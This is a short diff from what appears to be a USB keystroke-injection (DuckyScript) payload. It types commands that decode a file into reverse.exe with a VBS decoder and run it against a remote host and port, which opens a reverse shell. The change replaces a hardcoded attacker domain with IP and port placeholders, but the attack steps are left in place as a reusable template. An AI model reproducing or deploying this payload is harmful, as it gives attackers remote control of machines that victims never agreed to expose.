@@ -93,7 +93,7 @@ CTRL z
 ENTER
 STRING cscript decoder.vbs reverse.txt reverse.exe
 ENTER
-STRING reverse.exe goose.r00tpgp.com 80
+STRING reverse.exe <DEST_IP> <PORT>
 ENTER
 STRING exit
 ENTER
